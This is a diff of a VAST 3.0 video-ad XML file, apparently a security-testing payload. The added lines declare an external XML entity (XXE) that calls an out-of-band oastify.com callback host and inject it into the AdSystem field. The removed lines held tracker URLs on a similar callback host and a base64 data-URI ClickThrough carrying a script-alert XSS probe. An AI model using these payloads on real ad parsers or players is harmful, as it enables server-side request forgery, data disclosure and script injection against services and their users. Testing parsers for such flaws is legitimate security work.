@@ -1,25 +1,24 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "http://nqhylou66zxxggr56zimh0pz6qch09oy.oastify.com/xxe">
+]>
 <VAST version="3.0">
-  <Ad> 
+  <Ad>
     <InLine>
-      <AdSystem>Test</AdSystem>
-      <AdTitle>Test Ad</AdTitle>
-      <Impression><![CDATA[http://2ordj3sl4evcevpk4eg1ffne45awynmc.oastify.com/track]]></Impression>
+      <AdSystem>&xxe;</AdSystem>
       <Creatives>
         <Creative>
           <Linear>
             <Duration>00:00:30</Duration>
             <MediaFiles>
               <MediaFile type="video/mp4" delivery="progressive">
-                <![CDATA[http://2ordj3sl4evcevpk4eg1ffne45awynmc.oastify.com/video.mp4]]>
+                <![CDATA[http://example.com/video.mp4]]>
               </MediaFile>
             </MediaFiles>
-            <VideoClicks>
-              <ClickThrough><![CDATA[data:text/html;base64,PHNjcmlwdD5hbGVydCgnW1hTU10nKTwvc2NyaXB0Pg==]]></ClickThrough>
-            </VideoClicks>
           </Linear>
         </Creative>
       </Creatives>
     </InLine>
-  </Ad> 
+  </Ad>
 </VAST>
+
